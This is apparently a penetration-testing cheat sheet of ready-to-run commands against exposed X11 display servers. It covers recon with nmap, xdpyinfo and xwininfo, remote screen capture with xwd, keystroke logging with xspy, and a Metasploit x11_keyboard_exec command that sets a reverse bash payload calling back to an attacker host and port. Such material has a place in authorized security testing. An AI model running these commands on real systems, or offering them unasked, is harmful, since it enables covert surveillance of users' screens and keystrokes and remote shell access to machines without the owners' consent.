# X11

## recon

### Access check

Check access check with X11.

```sh title:"X11 Check Access Check"
nmap -sV --script x11-access -p "$rport" "$rhost_ip"
```
<!-- cheat
var rhost_ip
var rport := 6000
-->

### Display info

Show display info with X11.

```sh title:"X11 Show Display Info"
xdpyinfo -display "$rhost_ip:$display"
```
<!-- cheat
var rhost_ip
var display := 0
-->

### Window tree

List window tree with X11.

```sh title:"X11 List Window Tree"
xwininfo -root -tree -display "$rhost_ip:$display"
```
<!-- cheat
var rhost_ip
var display := 0
-->

## capture

### Screenshot

Run screenshot with X11.

```sh title:"X11 Run Screenshot"
xwd -root -screen -silent -display "$rhost_ip:$display" > screenshot.xwd; convert screenshot.xwd screenshot.png
```
<!-- cheat
var rhost_ip
var display := 0
-->

### Keylog

Run keylog with X11.

```sh title:"X11 Run Keylog"
xspy "$rhost_ip"
```
<!-- cheat
var rhost_ip
-->

## exploit

### Metasploit keyboard exec

Start metasploit keyboard exec with X11.

```sh title:"X11 Start Metasploit Keyboard Exec"
msfconsole -x "use exploit/unix/x11/x11_keyboard_exec; set RHOSTS $rhost_ip; set payload cmd/unix/reverse_bash; set LHOST $lhost; set LPORT $lport; run; exit"
```
<!-- cheat
var rhost_ip
var lhost
var lport
-->
